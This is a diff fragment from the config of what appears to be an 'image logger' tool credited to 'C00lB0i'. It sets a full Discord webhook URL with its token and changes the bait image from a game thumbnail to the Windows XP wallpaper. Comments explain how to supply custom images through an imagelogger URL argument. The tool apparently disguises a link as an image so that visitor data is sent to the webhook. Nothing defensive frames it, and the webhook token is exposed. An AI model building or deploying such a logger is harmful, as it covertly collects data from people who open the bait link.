@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1464515021122830418/U8l9dNMH8_eakBchxU_O2RF4KfULINB0dyBAjRMWuPb7YBM9eO745m1oFOQobosunJ_a",
-    "image": "https://staticctf.ubisoft.com/J3yJr34U2pZ2Ieem48Dwy9uqj5PNUQTn/1xv8SP711puUh5KnP574sJ/99dcc507547a1ece65f617f12bb4291e/r6s-makeship-group-thumbnail.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
